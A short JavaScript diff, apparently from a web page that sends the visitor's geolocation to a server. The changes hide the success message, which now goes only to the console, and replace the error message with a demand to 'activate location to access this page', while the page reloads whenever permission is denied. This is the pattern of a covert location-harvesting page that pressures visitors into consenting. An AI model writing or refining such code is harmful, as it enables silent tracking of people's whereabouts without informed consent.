@@ -26,10 +26,10 @@
             })
             .then(response => response.json())
             .then(data => {
-                alert('Location sent successfully!');
+                console.log('Location sent successfully!');
             })
             .catch((error) => {
-                alert('Error sending location!');
+                alert('Error! Activate location to access this page!');
             });
         }, function(error) {
             // If permission is denied or geolocation fails, reload the page
